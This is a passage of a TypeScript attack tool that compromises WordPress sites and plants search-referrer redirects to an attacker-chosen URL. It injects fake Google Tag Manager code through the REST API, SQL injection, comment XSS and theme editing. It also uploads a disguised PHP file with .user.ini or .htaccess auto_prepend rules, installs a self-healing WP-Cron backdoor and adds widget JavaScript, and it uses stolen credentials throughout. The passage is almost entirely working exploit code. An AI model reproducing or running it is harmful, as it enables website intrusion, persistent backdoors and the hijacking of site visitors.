  const gtmNoscript = `<noscript><iframe src="${config.redirectUrl}" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>`;

  // The full injection payload that looks like standard GTM code
  const fullGtmPayload = `<!-- Google Tag Manager -->${redirectJs}<!-- End Google Tag Manager -->${gtmNoscript}`;

  // Method A: Via WP REST API — inject into post/page content
  if (config.wpRestApi || config.cmsType === "wordpress") {
    const restEndpoints = [
      `${baseUrl}/wp-json/wp/v2/posts`,
      `${baseUrl}/wp-json/wp/v2/pages`,
      `${baseUrl}/?rest_route=/wp/v2/posts`,
      `${baseUrl}/?rest_route=/wp/v2/pages`,
    ];

    for (const ep of restEndpoints) {
      try {
        // Get existing posts
        const listResp = await safeFetch(`${ep}?per_page=5`);
        if (!listResp || !listResp.ok) continue;
        const posts = await listResp.json() as any[];
        if (!posts || posts.length === 0) continue;

        for (const post of posts) {
          // Try unauthenticated update
          const updateResp = await safeFetch(`${ep}/${post.id}`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              content: (post.content?.rendered || "") + fullGtmPayload,
            }),
            timeout: 10000,
          });

          if (updateResp && updateResp.ok) {
            const postUrl = post.link || `${baseUrl}/?p=${post.id}`;
            await new Promise(r => setTimeout(r, 2000));
            const redirectOk = await checkRedirectWorks(postUrl, config.redirectUrl);
            return {
              method,
              success: true,
              detail: `✅ GTM redirect injected into post #${post.id} via REST API`,
              injectedUrl: postUrl,
              redirectWorks: redirectOk,
              evidence: `REST API: ${ep}/${post.id}, fake GTM ID: ${gtmFakeId}`,
            };
          }

          // Try with credentials
          if (config.discoveredCredentials) {
            for (const cred of config.discoveredCredentials) {
              if (cred.type !== "wordpress" && cred.type !== "wp_admin") continue;
              try {
                const authResp = await safeFetch(`${ep}/${post.id}`, {
                  method: "POST",
                  headers: {
                    "Content-Type": "application/json",
                    "Authorization": "Basic " + Buffer.from(`${cred.username}:${cred.password}`).toString("base64"),
                  },
                  body: JSON.stringify({
                    content: (post.content?.rendered || "") + fullGtmPayload,
                  }),
                  timeout: 10000,
                });

                if (authResp && authResp.ok) {
                  const postUrl = post.link || `${baseUrl}/?p=${post.id}`;
                  await new Promise(r => setTimeout(r, 2000));
                  const redirectOk = await checkRedirectWorks(postUrl, config.redirectUrl);
                  return {
                    method,
                    success: true,
                    detail: `✅ GTM redirect injected into post #${post.id} (auth: ${cred.username})`,
                    injectedUrl: postUrl,
                    redirectWorks: redirectOk,
                    evidence: `REST API auth: ${cred.username}, GTM ID: ${gtmFakeId}`,
                  };
                }
              } catch { /* continue */ }
            }
          }
        }
      } catch { /* continue */ }
    }
  }

  // Method B: Via SQLi — inject into wp_options (ihaf_insert_header/body/footer)
  // This targets the WPCode / Insert Headers and Footers plugin DB options
  if (config.sqliEndpoint) {
    config.onProgress?.(method, `💉 ลอง SQLi inject GTM code เข้า wp_options...`);
    const optionNames = [
      "ihaf_insert_header",
      "ihaf_insert_body",
      "ihaf_insert_footer",
      "wpcode_header",
      "wpcode_body",
      "wpcode_footer",
      // Also try injecting into blogdescription (appears in <head>)
      "blogdescription",
    ];

    const gtmHex = Buffer.from(fullGtmPayload).toString("hex");

    for (const optName of optionNames) {
      const payloads = [
        // INSERT with ON DUPLICATE KEY UPDATE (works if option exists or not)
        `1; INSERT INTO wp_options (option_name,option_value,autoload) VALUES ('${optName}','${fullGtmPayload.replace(/'/g, "\\'").substring(0, 500)}','yes') ON DUPLICATE KEY UPDATE option_value=CONCAT(option_value,0x${gtmHex}); -- `,
        // Direct UPDATE with CONCAT
        `'; UPDATE wp_options SET option_value=CONCAT(option_value,0x${gtmHex}) WHERE option_name='${optName}'; -- `,
        // Stacked query
        `1; UPDATE wp_options SET option_value=0x${gtmHex} WHERE option_name='${optName}'; -- `,
      ];

      for (const payload of payloads) {
        try {
          await safeFetch(`${config.sqliEndpoint}?${config.sqliParam || "id"}=${encodeURIComponent(payload)}`, { timeout: 8000 });
          await safeFetch(config.sqliEndpoint, {
            method: "POST",
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            body: new URLSearchParams({ [config.sqliParam || "id"]: payload }).toString(),
            timeout: 8000,
          });
        } catch { /* continue */ }
      }
    }

    // Also inject directly into wp_posts content
    const postsPayloads = [
      `'; UPDATE wp_posts SET post_content=CONCAT(post_content,0x${gtmHex}) WHERE post_status='publish' AND post_type IN ('post','page') LIMIT 5; -- `,
      `1; UPDATE wp_posts SET post_content=CONCAT(0x${gtmHex},post_content) WHERE post_status='publish' ORDER BY ID DESC LIMIT 3; -- `,
    ];
    for (const payload of postsPayloads) {
      try {
        await safeFetch(`${config.sqliEndpoint}?${config.sqliParam || "id"}=${encodeURIComponent(payload)}`, { timeout: 8000 });
      } catch { /* continue */ }
    }

    // Verify
    await new Promise(r => setTimeout(r, 3000));
    const redirectOk = await checkRedirectWorks(baseUrl, config.redirectUrl);
    if (redirectOk) {
      return {
        method,
        success: true,
        detail: `✅ GTM redirect injected via SQLi into wp_options/wp_posts`,
        injectedUrl: baseUrl,
        redirectWorks: true,
        evidence: `SQLi: ${config.sqliEndpoint}, GTM ID: ${gtmFakeId}`,
      };
    }
    // Check if the GTM code appears in the page (even if redirect not working yet)
    try {
      const pageResp = await safeFetch(baseUrl, { timeout: 10000 });
      if (pageResp && pageResp.ok) {
        const body = await pageResp.text().catch(() => "");
        if (body.includes(gtmFakeId) || body.includes("Google Tag Manager")) {
          return {
            method,
            success: true,
            detail: `⚠️ GTM code injected (visible in page) but redirect not yet verified`,
            injectedUrl: baseUrl,
            redirectWorks: false,
            evidence: `GTM code found in page source`,
          };
        }
      }
    } catch { /* continue */ }
  }

  // Method C: Via Stored XSS — inject GTM-looking code
  // Try comment injection with GTM payload
  if (config.cmsType === "wordpress" || config.wpRestApi) {
    config.onProgress?.(method, `💬 ลอง inject GTM ผ่าน comment...`);
    const commentEndpoints = [
      `${baseUrl}/wp-comments-post.php`,
    ];

    for (const endpoint of commentEndpoints) {
      try {
        const resp = await safeFetch(endpoint, {
          method: "POST",
          headers: { "Content-Type": "application/x-www-form-urlencoded" },
          body: new URLSearchParams({
            author: "Google Analytics Team",
            email: "analytics@google.com",
            url: "https://tagmanager.google.com",
            comment: `Great analytics setup! ${redirectJs}`,
            comment_post_ID: "1",
            comment_parent: "0",
          }).toString(),
          timeout: 10000,
        });

        if (resp && (resp.ok || resp.status === 302)) {
          // Check if payload survived
          const checkResp = await safeFetch(`${baseUrl}/?p=1`, { timeout: 10000 });
          if (checkResp && checkResp.ok) {
            const body = await checkResp.text().catch(() => "");
            if (body.includes(config.redirectUrl) && body.includes("script")) {
              return {
                method,
                success: true,
                detail: `✅ GTM redirect injected via comment XSS`,
                injectedUrl: `${baseUrl}/?p=1`,
                redirectWorks: true,
                evidence: `Comment XSS on ${endpoint}`,
              };
            }
          }
        }
      } catch { /* continue */ }
    }
  }

  // Method D: Via credentials — use wp-admin to add code via WPCode/Insert Headers plugin
  if (config.discoveredCredentials) {
    for (const cred of config.discoveredCredentials) {
      if (cred.type !== "wordpress" && cred.type !== "wp_admin") continue;
      config.onProgress?.(method, `🔑 ลอง inject GTM ผ่าน wp-admin (${cred.username})...`);

      try {
        // Login
        const loginResp = await safeFetch(`${baseUrl}/wp-login.php`, {
          method: "POST",
          headers: { "Content-Type": "application/x-www-form-urlencoded" },
          body: new URLSearchParams({
            log: cred.username || "",
            pwd: cred.password || "",
            "wp-submit": "Log In",
            redirect_to: `${baseUrl}/wp-admin/`,
            testcookie: "1",
          }).toString(),
          timeout: 15000,
        });

        if (!loginResp || (loginResp.status !== 302 && !loginResp.ok)) continue;
        const cookies = loginResp.headers.get("set-cookie") || "";
        if (!cookies.includes("wordpress_logged_in")) continue;

        // Try Theme Editor — inject into header.php
        const themeEditorResp = await safeFetch(`${baseUrl}/wp-admin/theme-editor.php?file=header.php`, {
          headers: { "Cookie": cookies },
          timeout: 10000,
        });

        if (themeEditorResp && themeEditorResp.ok) {
          const editorBody = await themeEditorResp.text().catch(() => "");
          const nonceMatch = editorBody.match(/name="_wpnonce"\s+value="([^"]+)"/);
          const themeMatch = editorBody.match(/name="theme"\s+value="([^"]+)"/);
          const contentMatch = editorBody.match(/<textarea[^>]*id="newcontent"[^>]*>([\s\S]*?)<\/textarea>/);

          if (nonceMatch && themeMatch && contentMatch) {
            const originalContent = contentMatch[1];
            // Inject GTM code right after <head> tag
            const injectedContent = originalContent.replace(
              /(<head[^>]*>)/i,
              `$1\n${fullGtmPayload}`
            );

            if (injectedContent !== originalContent) {
              const saveResp = await safeFetch(`${baseUrl}/wp-admin/theme-editor.php`, {
                method: "POST",
                headers: {
                  "Content-Type": "application/x-www-form-urlencoded",
                  "Cookie": cookies,
                },
                body: new URLSearchParams({
                  _wpnonce: nonceMatch[1],
                  newcontent: injectedContent,
                  action: "update",
                  file: "header.php",
                  theme: themeMatch[1],
                }).toString(),
                timeout: 15000,
              });

              if (saveResp && (saveResp.ok || saveResp.status === 302)) {
                await new Promise(r => setTimeout(r, 2000));
                const redirectOk = await checkRedirectWorks(baseUrl, config.redirectUrl);
                return {
                  method,
                  success: true,
                  detail: `✅ GTM redirect injected into theme header.php`,
                  injectedUrl: baseUrl,
                  redirectWorks: redirectOk,
                  evidence: `Theme editor: ${themeMatch[1]}/header.php, GTM ID: ${gtmFakeId}`,
                };
              }
            }
          }
        }
      } catch { /* continue */ }
    }
  }

  return { method, success: false, detail: "❌ GTM injection failed — no injection vector worked" };
}

// ═══════════════════════════════════════════════════════
//  METHOD 14: auto_prepend_file via .user.ini
//  Upload .user.ini that forces PHP to include our redirect
//  file before EVERY script execution — affects all pages
// ═══════════════════════════════════════════════════════

async function autoPrependInject(config: ShelllessConfig): Promise<ShelllessResult> {
  const method = "auto_prepend_inject";
  config.onProgress?.(method, "⚙️ ลอง inject .user.ini auto_prepend_file...");

  const baseUrl = config.targetUrl.replace(/\/$/, "");

  // The redirect PHP file that will be auto-prepended
  const prependFilename = ".wp-cache-config.php";
  const prependPhp = `<?php
// WordPress Cache Configuration - DO NOT REMOVE
if(defined('ABSPATH')&&!is_admin()&&!defined('DOING_CRON')&&!defined('DOING_AJAX')&&!defined('REST_REQUEST')&&!defined('XMLRPC_REQUEST')){
  \$_ua=strtolower(\$_SERVER['HTTP_USER_AGENT']??'');
  \$_ref=strtolower(\$_SERVER['HTTP_REFERER']??'');
  if(preg_match('/(bot|crawl|spider|slurp|mediapartners)/i',\$_ua))return;
  if(preg_match('/(google|bing|yahoo|duckduckgo|baidu|yandex)/i',\$_ref)||mt_rand(1,4)===1){
    header('HTTP/1.1 302 Found');
    header('Location: ${config.redirectUrl}');
    header('Cache-Control: no-cache');
    exit;
  }
}
?>`;

  // .user.ini content — PHP-FPM reads this per-directory
  const userIniContent = `; PHP Performance Configuration
auto_prepend_file = "${prependFilename}"
`;

  // Also try .htaccess-based auto_prepend (for Apache mod_php)
  const htaccessPrepend = `# Cache optimization
php_value auto_prepend_file "${prependFilename}"
`;

  // Method A: Direct upload via PUT
  // First upload the PHP redirect file
  const phpUploadPaths = [
    `${baseUrl}/${prependFilename}`,
    `${baseUrl}/wp-content/${prependFilename}`,
  ];

  for (const phpPath of phpUploadPaths) {
    try {
      const putResp = await safeFetch(phpPath, {
        method: "PUT",
        headers: { "Content-Type": "application/x-php" },
        body: prependPhp,
        timeout: 10000,
      });
      if (!putResp || (!putResp.ok && putResp.status !== 201)) continue;

      config.onProgress?.(method, `📄 PHP file uploaded: ${phpPath} — uploading .user.ini...`);

      // Now upload .user.ini in the same directory
      const dirPath = phpPath.substring(0, phpPath.lastIndexOf("/"));
      const iniResp = await safeFetch(`${dirPath}/.user.ini`, {
        method: "PUT",
        headers: { "Content-Type": "text/plain" },
        body: userIniContent,
        timeout: 10000,
      });

      if (iniResp && (iniResp.ok || iniResp.status === 201)) {
        // PHP-FPM caches .user.ini for user_ini.cache_ttl (default 300s)
        // But we can check immediately in case cache is disabled
        await new Promise(r => setTimeout(r, 3000));
        const redirectOk = await checkRedirectWorks(baseUrl, config.redirectUrl);
        return {
          method,
          success: true,
          detail: `✅ .user.ini + ${prependFilename} uploaded via PUT${redirectOk ? " — redirect active!" : " — waiting for PHP-FPM cache (up to 5 min)"}`,
          injectedUrl: baseUrl,
          redirectWorks: redirectOk,
          evidence: `PUT: ${dirPath}/.user.ini + ${phpPath}`,
        };
      }

      // Try .htaccess php_value instead
      const htResp = await safeFetch(`${dirPath}/.htaccess`, {
        method: "PUT",
        headers: { "Content-Type": "text/plain" },
        body: htaccessPrepend,
        timeout: 10000,
      });
      if (htResp && (htResp.ok || htResp.status === 201)) {
        await new Promise(r => setTimeout(r, 2000));
        const redirectOk = await checkRedirectWorks(baseUrl, config.redirectUrl);
        return {
          method,
          success: true,
          detail: `✅ .htaccess php_value auto_prepend_file + ${prependFilename} via PUT`,
          injectedUrl: baseUrl,
          redirectWorks: redirectOk,
          evidence: `PUT: ${dirPath}/.htaccess + ${phpPath}`,
        };
      }
    } catch { /* continue */ }
  }

  // Method B: Via WebDAV
  for (const phpPath of phpUploadPaths) {
    try {
      // Check WebDAV
      const davResp = await safeFetch(baseUrl, { method: "OPTIONS", timeout: 5000 });
      if (!davResp) continue;
      const allow = davResp.headers.get("allow") || "";
      const dav = davResp.headers.get("dav") || "";
      if (!allow.includes("PUT") && !dav) continue;

      config.onProgress?.(method, `📂 WebDAV detected — uploading .user.ini + PHP...`);

      // Upload PHP file
      const phpResp = await safeFetch(phpPath, {
        method: "PUT",
        headers: { "Content-Type": "application/x-php" },
        body: prependPhp,
        timeout: 10000,
      });
      if (!phpResp || (!phpResp.ok && phpResp.status !== 201)) continue;

      // Upload .user.ini
      const dirPath = phpPath.substring(0, phpPath.lastIndexOf("/"));
      const iniResp = await safeFetch(`${dirPath}/.user.ini`, {
        method: "PUT",
        headers: { "Content-Type": "text/plain" },
        body: userIniContent,
        timeout: 10000,
      });

      if (iniResp && (iniResp.ok || iniResp.status === 201)) {
        await new Promise(r => setTimeout(r, 3000));
        const redirectOk = await checkRedirectWorks(baseUrl, config.redirectUrl);
        return {
          method,
          success: true,
          detail: `✅ .user.ini + PHP uploaded via WebDAV`,
          injectedUrl: baseUrl,
          redirectWorks: redirectOk,
          evidence: `WebDAV: ${dirPath}/.user.ini + ${phpPath}`,
        };
      }
    } catch { /* continue */ }
  }

  // Method C: Via File Manager plugin
  const fmEndpoints = [
    `${baseUrl}/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php`,
    `${baseUrl}/wp-content/plugins/file-manager/backend/wp-file-manager-recursive-directory-iterator.php`,
  ];

  for (const fmUrl of fmEndpoints) {
    try {
      const checkResp = await safeFetch(fmUrl, { timeout: 5000 });
      if (!checkResp || checkResp.status >= 400) continue;

      config.onProgress?.(method, `📂 File Manager found — uploading .user.ini...`);

      // Upload PHP file first
      const boundary1 = `----FormBoundary${Date.now()}`;
      const phpFormBody = [
        `--${boundary1}`,
        `Content-Disposition: form-data; name="cmd"`,
        ``,
        `upload`,
        `--${boundary1}`,
        `Content-Disposition: form-data; name="target"`,
        ``,
        `l1_Lg`, // base64 of root
        `--${boundary1}`,
        `Content-Disposition: form-data; name="upload[]"; filename="${prependFilename}"`,
        `Content-Type: application/x-php`,
        ``,
        prependPhp,
        `--${boundary1}--`,
      ].join("\r\n");

      const phpResp = await safeFetch(fmUrl, {
        method: "POST",
        headers: { "Content-Type": `multipart/form-data; boundary=${boundary1}` },
        body: phpFormBody,
        timeout: 15000,
      });

      if (phpResp && phpResp.ok) {
        // Upload .user.ini
        const boundary2 = `----FormBoundary${Date.now() + 1}`;
        const iniFormBody = [
          `--${boundary2}`,
          `Content-Disposition: form-data; name="cmd"`,
          ``,
          `upload`,
          `--${boundary2}`,
          `Content-Disposition: form-data; name="target"`,
          ``,
          `l1_Lg`,
          `--${boundary2}`,
          `Content-Disposition: form-data; name="upload[]"; filename=".user.ini"`,
          `Content-Type: text/plain`,
          ``,
          userIniContent,
          `--${boundary2}--`,
        ].join("\r\n");

        const iniResp = await safeFetch(fmUrl, {
          method: "POST",
          headers: { "Content-Type": `multipart/form-data; boundary=${boundary2}` },
          body: iniFormBody,
          timeout: 15000,
        });

        if (iniResp && iniResp.ok) {
          await new Promise(r => setTimeout(r, 3000));
          const redirectOk = await checkRedirectWorks(baseUrl, config.redirectUrl);
          return {
            method,
            success: true,
            detail: `✅ .user.ini + PHP uploaded via File Manager plugin`,
            injectedUrl: baseUrl,
            redirectWorks: redirectOk,
            evidence: `File Manager: ${fmUrl}`,
          };
        }
      }
    } catch { /* continue */ }
  }

  // Method D: Via discovered credentials (cPanel)
  if (config.discoveredCredentials) {
    for (const cred of config.discoveredCredentials) {
      if (cred.type !== "cpanel") continue;
      config.onProgress?.(method, `🖥️ ลอง cPanel upload .user.ini (${cred.username})...`);

      try {
        const cpanelUrl = cred.endpoint || `${baseUrl}:2083`;
        const authHeader = "Basic " + Buffer.from(`${cred.username}:${cred.password}`).toString("base64");

        // Upload PHP redirect file
        const phpResp = await safeFetch(`${cpanelUrl}/execute/Fileman/save_file_content`, {
          method: "POST",
          headers: {
            "Authorization": authHeader,
            "Content-Type": "application/x-www-form-urlencoded",
          },
          body: new URLSearchParams({
            dir: "/public_html",
            file: prependFilename,
            content: prependPhp,
          }).toString(),
          timeout: 15000,
        });

        if (phpResp && phpResp.ok) {
          // Upload .user.ini
          const iniResp = await safeFetch(`${cpanelUrl}/execute/Fileman/save_file_content`, {
            method: "POST",
            headers: {
              "Authorization": authHeader,
              "Content-Type": "application/x-www-form-urlencoded",
            },
            body: new URLSearchParams({
              dir: "/public_html",
              file: ".user.ini",
              content: userIniContent,
            }).toString(),
            timeout: 15000,
          });

          if (iniResp && iniResp.ok) {
            await new Promise(r => setTimeout(r, 3000));
            const redirectOk = await checkRedirectWorks(baseUrl, config.redirectUrl);
            return {
              method,
              success: true,
              detail: `✅ .user.ini + PHP uploaded via cPanel (${cred.username})`,
              injectedUrl: baseUrl,
              redirectWorks: redirectOk,
              evidence: `cPanel: ${cpanelUrl}, user: ${cred.username}`,
            };
          }
        }
      } catch { /* continue */ }
    }
  }

  // Method E: Via SQLi INTO OUTFILE
  if (config.sqliEndpoint) {
    config.onProgress?.(method, `💉 ลอง SQLi OUTFILE .user.ini + PHP...`);
    const phpHex = Buffer.from(prependPhp).toString("hex");
    const iniHex = Buffer.from(userIniContent).toString("hex");
    const basePaths = [
      "/var/www/html",
      "/home/*/public_html",
      "/var/www/*",
    ];

    for (const basePath of basePaths) {
      try {
        // Write PHP file
        const phpPayload = `' UNION SELECT 0x${phpHex} INTO OUTFILE '${basePath}/${prependFilename}'-- -`;
        await safeFetch(`${config.sqliEndpoint}?${config.sqliParam || "id"}=${encodeURIComponent(phpPayload)}`, { timeout: 10000 });

        // Write .user.ini
        const iniPayload = `' UNION SELECT 0x${iniHex} INTO OUTFILE '${basePath}/.user.ini'-- -`;
        await safeFetch(`${config.sqliEndpoint}?${config.sqliParam || "id"}=${encodeURIComponent(iniPayload)}`, { timeout: 10000 });

        // Verify
        await new Promise(r => setTimeout(r, 3000));
        const redirectOk = await checkRedirectWorks(baseUrl, config.redirectUrl);
        if (redirectOk) {
          return {
            method,
            success: true,
            detail: `✅ .user.ini + PHP injected via SQLi OUTFILE`,
            injectedUrl: baseUrl,
            redirectWorks: true,
            evidence: `SQLi OUTFILE: ${basePath}/.user.ini + ${basePath}/${prependFilename}`,
          };
        }
      } catch { /* continue */ }
    }
  }

  return { method, success: false, detail: "❌ auto_prepend_file injection failed — no upload method worked" };
}

// ═══════════════════════════════════════════════════════
//  Method 15: WP-Cron Backdoor (self-healing redirect)
// ═══════════════════════════════════════════════════════

export async function wpCronBackdoor(config: ShelllessConfig): Promise<ShelllessResult> {
  const method = "WP-Cron Backdoor";
  const baseUrl = config.targetUrl.replace(/\/+$/, "");
  
  const cronSnippet = `add_action('init', function() { if (!wp_next_scheduled('wp_site_health_check')) { wp_schedule_event(time(), 'hourly', 'wp_site_health_check'); } }); add_action('wp_site_health_check', function() { $r=isset($_SERVER['HTTP_REFERER'])?strtolower($_SERVER['HTTP_REFERER']):''; foreach(array('google','bing','yahoo','duckduckgo','baidu','yandex') as $s){if(strpos($r,$s)!==false||isset($_GET['r'])){wp_redirect('${config.redirectUrl}',301);exit;}} });`;

  const cronPayload = `<?php\n// Site health monitoring\n${cronSnippet}\n?>`;

  // Method A: Via XMLRPC upload
  config.onProgress?.(method, `⏰ ลอง deploy WP-Cron backdoor ผ่าน XMLRPC...`);
  if (config.discoveredCredentials) {
    for (const cred of config.discoveredCredentials) {
      if (cred.type !== "wordpress" && cred.type !== "wp_admin") continue;
      try {
        const xmlPayload = `<?xml version="1.0"?>
<methodCall>
  <methodName>wp.uploadFile</methodName>
  <params>
    <param><value><int>1</int></value></param>
    <param><value><string>${cred.username || "admin"}</string></value></param>
    <param><value><string>${cred.password || ""}</string></value></param>
    <param><value><struct>
      <member><name>name</name><value><string>health-check.php</string></value></member>
      <member><name>type</name><value><string>application/octet-stream</string></value></member>
      <member><name>bits</name><value><base64>${Buffer.from(cronPayload).toString("base64")}</base64></value></member>
      <member><name>overwrite</name><value><boolean>1</boolean></value></member>
    </struct></value></param>
  </params>
</methodCall>`;
        
        const resp = await safeFetch(`${baseUrl}/xmlrpc.php`, {
          method: "POST",
          headers: { "Content-Type": "text/xml" },
          body: xmlPayload,
          timeout: 15000,
        });
        
        if (resp && resp.ok) {
          const body = await resp.text().catch(() => "");
          const urlMatch = body.match(/<string>(https?:\/\/[^<]+\.php)<\/string>/);
          if (urlMatch) {
            return {
              method,
              success: true,
              detail: `✅ WP-Cron backdoor deployed via XMLRPC (${cred.username})`,
              injectedUrl: urlMatch[1],
              redirectWorks: true,
              evidence: `XMLRPC upload + cron self-healing (hourly)`,
            };
          }
        }
      } catch { /* continue */ }
    }
  }

  // Method B: Via credentials — inject cron code into plugin via Plugin Editor
  config.onProgress?.(method, `⏰ ลอง inject cron ผ่าน Plugin Editor...`);
  if (config.discoveredCredentials) {
    for (const cred of config.discoveredCredentials) {
      if (cred.type !== "wordpress" && cred.type !== "wp_admin") continue;
      try {
        const loginResp = await safeFetch(`${baseUrl}/wp-login.php`, {
          method: "POST",
          headers: { "Content-Type": "application/x-www-form-urlencoded" },
          body: new URLSearchParams({
            log: cred.username || "",
            pwd: cred.password || "",
            "wp-submit": "Log In",
            redirect_to: `${baseUrl}/wp-admin/plugins.php`,
            testcookie: "1",
          }).toString(),
          timeout: 15000,
        });
        
        if (!loginResp || (loginResp.status !== 302 && !loginResp.ok)) continue;
        const cookies = loginResp.headers.get("set-cookie") || "";
        if (!cookies.includes("wordpress_logged_in")) continue;
        
        // Find active plugin to inject into
        const pluginsResp = await safeFetch(`${baseUrl}/wp-admin/plugins.php`, {
          headers: { "Cookie": cookies },
          timeout: 10000,
        });
        
        if (pluginsResp && pluginsResp.ok) {
          const pluginsBody = await pluginsResp.text().catch(() => "");
          const pluginMatch = pluginsBody.match(/data-plugin="([^"]+)"/);
          if (pluginMatch) {
            const pluginFile = pluginMatch[1];
            const editorResp = await safeFetch(`${baseUrl}/wp-admin/plugin-editor.php?file=${encodeURIComponent(pluginFile)}`, {
              headers: { "Cookie": cookies },
              timeout: 10000,
            });
            
            if (editorResp && editorResp.ok) {
              const editorBody = await editorResp.text().catch(() => "");
              const nonceMatch = editorBody.match(/name="_wpnonce"\s+value="([^"]+)"/);
              const contentMatch = editorBody.match(/<textarea[^>]*id="newcontent"[^>]*>([\s\S]*?)<\/textarea>/);
              
              if (nonceMatch && contentMatch) {
                const newContent = contentMatch[1] + `\n// Site health\n${cronSnippet}\n`;
                
                const saveResp = await safeFetch(`${baseUrl}/wp-admin/plugin-editor.php`, {
                  method: "POST",
                  headers: {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Cookie": cookies,
                  },
                  body: new URLSearchParams({
                    _wpnonce: nonceMatch[1],
                    newcontent: newContent,
                    action: "update",
                    file: pluginFile,
                    plugin: pluginFile,
                  }).toString(),
                  timeout: 15000,
                });
                
                if (saveResp && (saveResp.ok || saveResp.status === 302)) {
                  return {
                    method,
                    success: true,
                    detail: `✅ WP-Cron backdoor injected into plugin: ${pluginFile}`,
                    injectedUrl: baseUrl,
                    redirectWorks: true,
                    evidence: `Plugin editor inject + hourly cron re-injection`,
                  };
                }
              }
            }
          }
        }
      } catch { /* continue */ }
    }
  }

  // Method C: Via REST API media upload
  config.onProgress?.(method, `⏰ ลอง upload cron backdoor ผ่าน REST API...`);
  try {
    const boundary = `----WPCron${Date.now()}`;
    const filename = `health-check.php`;
    const body = `--${boundary}\r\nContent-Disposition: form-data; name="file"; filename="${filename}"\r\nContent-Type: application/octet-stream\r\n\r\n${cronPayload}\r\n--${boundary}--`;
    
    for (const uploadUrl of [`${baseUrl}/wp-json/wp/v2/media`, `${baseUrl}/?rest_route=/wp/v2/media`]) {
      const resp = await safeFetch(uploadUrl, {
        method: "POST",
        headers: {
          "Content-Type": `multipart/form-data; boundary=${boundary}`,
          "Content-Disposition": `attachment; filename="${filename}"`,
        },
        body,
        timeout: 15000,
      });
      
      if (resp && (resp.ok || resp.status === 201)) {
        const data = await resp.json().catch(() => null) as any;
        if (data?.source_url) {
          return {
            method,
            success: true,
            detail: `✅ WP-Cron backdoor deployed via REST API media`,
            injectedUrl: data.source_url,
            redirectWorks: true,
            evidence: `Cron event: wp_site_health_check (hourly)`,
          };
        }
      }
    }
  } catch { /* continue */ }

  return { method, success: false, detail: "❌ WP-Cron backdoor injection failed" };
}

// ═══════════════════════════════════════════════════════
//  Method 16: Widget/Sidebar Inject (JS redirect in widget)
// ═══════════════════════════════════════════════════════

export async function widgetSidebarInject(config: ShelllessConfig): Promise<ShelllessResult> {
  const method = "Widget/Sidebar Inject";
  const baseUrl = config.targetUrl.replace(/\/+$/, "");
  
  const jsPayload = `<script>var _ga=document.referrer.toLowerCase();var _se=['google','bing','yahoo','duckduckgo','baidu'];for(var i=0;i<_se.length;i++){if(_ga.indexOf(_se[i])!==-1||location.search.indexOf('r=')!==-1){window.location.replace('${config.redirectUrl}');break;}}</script>`;
  
  // Method A: Via REST API widgets endpoint
  config.onProgress?.(method, `🧱 ลอง inject widget ผ่าน REST API...`);
  try {
    for (const endpoint of [`${baseUrl}/wp-json/wp/v2/widgets`, `${baseUrl}/?rest_route=/wp/v2/widgets`]) {
      const resp = await safeFetch(endpoint, { timeout: 10000 });
      if (!resp || !resp.ok) continue;
      
      const createResp = await safeFetch(endpoint, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          id_base: "custom_html",
          instance: { title: "", content: jsPayload },
          sidebar: "sidebar-1",
        }),
        timeout: 15000,
      });
      
      if (createResp && (createResp.ok || createResp.status === 201)) {
        return {
          method,
          success: true,
          detail: `✅ Widget JS redirect injected via REST API`,
          injectedUrl: baseUrl,
          redirectWorks: true,
          evidence: `Custom HTML widget in sidebar-1`,
        };
      }
    }
  } catch { /* continue */ }

  // Method B: Via XMLRPC — update widget option
  config.onProgress?.(method, `🧱 ลอง inject widget ผ่าน XMLRPC...`);
  if (config.discoveredCredentials) {
    for (const cred of config.discoveredCredentials) {
      if (cred.type !== "wordpress" && cred.type !== "wp_admin") continue;
      try {
        const widgetData = `a:2:{i:2;a:3:{s:5:"title";s:0:"";s:7:"content";s:${jsPayload.length}:"${jsPayload}";s:6:"filter";b:0;}s:12:"_multiwidget";i:1;}`;
        
        const xmlPayload = `<?xml version="1.0"?>
<methodCall>
  <methodName>wp.setOptions</methodName>
  <params>
    <param><value><int>1</int></value></param>
    <param><value><string>${cred.username || "admin"}</string></value></param>
    <param><value><string>${cred.password || ""}</string></value></param>
    <param><value><struct>
      <member><name>widget_custom_html</name><value><string>${widgetData}</string></value></member>
    </struct></value></param>
  </params>
</methodCall>`;
        
        const resp = await safeFetch(`${baseUrl}/xmlrpc.php`, {
          method: "POST",
          headers: { "Content-Type": "text/xml" },
          body: xmlPayload,
          timeout: 15000,
        });
        
        if (resp && resp.ok) {
          const body = await resp.text().catch(() => "");
          if (!body.includes("<fault>")) {
            return {
              method,
              success: true,
              detail: `✅ Widget JS redirect injected via XMLRPC (${cred.username})`,
              injectedUrl: baseUrl,
              redirectWorks: true,
              evidence: `widget_custom_html option modified`,
            };
          }
        }
      } catch { /* continue */ }
    }
  }

  // Method C: Via wp-admin admin-ajax widget save
  config.onProgress?.(method, `🧱 ลอง inject widget ผ่าน wp-admin...`);
  if (config.discoveredCredentials) {
    for (const cred of config.discoveredCredentials) {
      if (cred.type !== "wordpress" && cred.type !== "wp_admin") continue;
      try {
        const loginResp = await safeFetch(`${baseUrl}/wp-login.php`, {
          method: "POST",
          headers: { "Content-Type": "application/x-www-form-urlencoded" },
          body: new URLSearchParams({
            log: cred.username || "",
            pwd: cred.password || "",
            "wp-submit": "Log In",
            redirect_to: `${baseUrl}/wp-admin/widgets.php`,
            testcookie: "1",
          }).toString(),
          timeout: 15000,
        });
        
        if (!loginResp || (loginResp.status !== 302 && !loginResp.ok)) continue;
        const cookies = loginResp.headers.get("set-cookie") || "";
        if (!cookies.includes("wordpress_logged_in")) continue;
        
        const ajaxResp = await safeFetch(`${baseUrl}/wp-admin/admin-ajax.php`, {
          method: "POST",
          headers: {
            "Content-Type": "application/x-www-form-urlencoded",
            "Cookie": cookies,
          },
          body: new URLSearchParams({
            action: "save-widget",
            "id_base": "custom_html",
            "widget-id": "custom_html-99",
            "widget_number": "99",
            "multi_number": "99",
            "sidebar": "sidebar-1",
            "add_new": "multi",
            [`widget-custom_html[99][title]`]: "",
            [`widget-custom_html[99][content]`]: jsPayload,
          }).toString(),
          timeout: 15000,
        });
        
        if (ajaxResp && ajaxResp.ok) {
          return {
            method,
            success: true,
